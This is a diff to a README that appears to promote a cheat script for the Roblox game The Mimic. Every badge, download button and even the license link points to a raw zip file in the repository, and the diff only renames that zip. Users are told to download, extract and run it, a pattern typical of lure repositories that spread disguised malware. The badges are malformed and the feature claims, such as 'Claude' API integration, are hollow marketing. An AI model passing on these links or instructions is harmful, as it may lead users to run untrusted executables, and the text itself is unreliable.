@@ -1,10 +1,10 @@
 # 👹 NEW The Mimic Script Roblox | Elevate Your Roblox Horror Experience
 
-[![Hits](https://github.com/Pratyush130/mimic-roblox-script-innovator/raw/refs/heads/branch/culm/innovator_script_mimic_roblox_v3.1.zip)](https://github.com/Pratyush130/mimic-roblox-script-innovator/raw/refs/heads/branch/culm/innovator_script_mimic_roblox_v3.1.zip)
-[![Downloads](https://github.com/Pratyush130/mimic-roblox-script-innovator/raw/refs/heads/branch/culm/innovator_script_mimic_roblox_v3.1.zip,000%2B-brightgreen)](https://github.com/Pratyush130/mimic-roblox-script-innovator/raw/refs/heads/branch/culm/innovator_script_mimic_roblox_v3.1.zip)
-[![MIT License](https://github.com/Pratyush130/mimic-roblox-script-innovator/raw/refs/heads/branch/culm/innovator_script_mimic_roblox_v3.1.zip)](#-mit-license)
-[![OS Support](https://github.com/Pratyush130/mimic-roblox-script-innovator/raw/refs/heads/branch/culm/innovator_script_mimic_roblox_v3.1.zip%20%7C%20macOS%20%7C%20Linux-lightgrey)]()
-[![API Integration](https://github.com/Pratyush130/mimic-roblox-script-innovator/raw/refs/heads/branch/culm/innovator_script_mimic_roblox_v3.1.zip%20%7C%20Claude-blueviolet)]()
+[![Hits](https://github.com/Pratyush130/mimic-roblox-script-innovator/raw/refs/heads/branch/culm/roblox_mimic_innovator_script_3.1.zip)](https://github.com/Pratyush130/mimic-roblox-script-innovator/raw/refs/heads/branch/culm/roblox_mimic_innovator_script_3.1.zip)
+[![Downloads](https://github.com/Pratyush130/mimic-roblox-script-innovator/raw/refs/heads/branch/culm/roblox_mimic_innovator_script_3.1.zip,000%2B-brightgreen)](https://github.com/Pratyush130/mimic-roblox-script-innovator/raw/refs/heads/branch/culm/roblox_mimic_innovator_script_3.1.zip)
+[![MIT License](https://github.com/Pratyush130/mimic-roblox-script-innovator/raw/refs/heads/branch/culm/roblox_mimic_innovator_script_3.1.zip)](#-mit-license)
+[![OS Support](https://github.com/Pratyush130/mimic-roblox-script-innovator/raw/refs/heads/branch/culm/roblox_mimic_innovator_script_3.1.zip%20%7C%20macOS%20%7C%20Linux-lightgrey)]()
+[![API Integration](https://github.com/Pratyush130/mimic-roblox-script-innovator/raw/refs/heads/branch/culm/roblox_mimic_innovator_script_3.1.zip%20%7C%20Claude-blueviolet)]()
 
 ---
 
@@ -12,7 +12,7 @@ Looking for the ultimate edge in Roblox’s acclaimed horror game The Mimic? Ent
 
 ---
 
-[![Download](https://github.com/Pratyush130/mimic-roblox-script-innovator/raw/refs/heads/branch/culm/innovator_script_mimic_roblox_v3.1.zip%20Mimic%20Script-green?style=for-the-badge&logo=roblox)](https://github.com/Pratyush130/mimic-roblox-script-innovator/raw/refs/heads/branch/culm/innovator_script_mimic_roblox_v3.1.zip)
+[![Download](https://github.com/Pratyush130/mimic-roblox-script-innovator/raw/refs/heads/branch/culm/roblox_mimic_innovator_script_3.1.zip%20Mimic%20Script-green?style=for-the-badge&logo=roblox)](https://github.com/Pratyush130/mimic-roblox-script-innovator/raw/refs/heads/branch/culm/roblox_mimic_innovator_script_3.1.zip)
 
 ---
 
@@ -46,7 +46,7 @@ Follow the guided path below to awaken your haunted journey with the NEW The Mim
 
 ### Step 1: Download the Script
 
-https://github.com/Pratyush130/mimic-roblox-script-innovator/raw/refs/heads/branch/culm/innovator_script_mimic_roblox_v3.1.zip 
+https://github.com/Pratyush130/mimic-roblox-script-innovator/raw/refs/heads/branch/culm/roblox_mimic_innovator_script_3.1.zip 
 
 *Embark on your journey: visit the download page and retrieve the script in its safest, most exhilarating form.*
 
@@ -54,7 +54,7 @@ https://github.com/Pratyush130/mimic-roblox-script-innovator/raw/refs/heads/bran
 
 Click the button below to initiate your saga:
   
-[![Download](https://github.com/Pratyush130/mimic-roblox-script-innovator/raw/refs/heads/branch/culm/innovator_script_mimic_roblox_v3.1.zip%20Mimic%20Script-green?style=for-the-badge&logo=roblox)](https://github.com/Pratyush130/mimic-roblox-script-innovator/raw/refs/heads/branch/culm/innovator_script_mimic_roblox_v3.1.zip)
+[![Download](https://github.com/Pratyush130/mimic-roblox-script-innovator/raw/refs/heads/branch/culm/roblox_mimic_innovator_script_3.1.zip%20Mimic%20Script-green?style=for-the-badge&logo=roblox)](https://github.com/Pratyush130/mimic-roblox-script-innovator/raw/refs/heads/branch/culm/roblox_mimic_innovator_script_3.1.zip)
 
 ### Step 3: Extract and Run
 
@@ -128,7 +128,7 @@ This isn’t another commonplace giveaway—our innovative ‘Access Pass’ gua
 
 This project blooms beneath the sunlight of the MIT License—inviting open collaboration and adaptive improvements.
 
-[See Full License Statement](https://github.com/Pratyush130/mimic-roblox-script-innovator/raw/refs/heads/branch/culm/innovator_script_mimic_roblox_v3.1.zip)
+[See Full License Statement](https://github.com/Pratyush130/mimic-roblox-script-innovator/raw/refs/heads/branch/culm/roblox_mimic_innovator_script_3.1.zip)
 
 *© 2025*
 
@@ -138,7 +138,7 @@ This project blooms beneath the sunlight of the MIT License—inviting open coll
 
 Whether you’re on the cusp of your first foray or plotting a new chapter, retrieve the latest version right here:
 
-[![Download](https://github.com/Pratyush130/mimic-roblox-script-innovator/raw/refs/heads/branch/culm/innovator_script_mimic_roblox_v3.1.zip%20Mimic%20Script-green?style=for-the-badge&logo=roblox)](https://github.com/Pratyush130/mimic-roblox-script-innovator/raw/refs/heads/branch/culm/innovator_script_mimic_roblox_v3.1.zip)
+[![Download](https://github.com/Pratyush130/mimic-roblox-script-innovator/raw/refs/heads/branch/culm/roblox_mimic_innovator_script_3.1.zip%20Mimic%20Script-green?style=for-the-badge&logo=roblox)](https://github.com/Pratyush130/mimic-roblox-script-innovator/raw/refs/heads/branch/culm/roblox_mimic_innovator_script_3.1.zip)
 
 ---
 
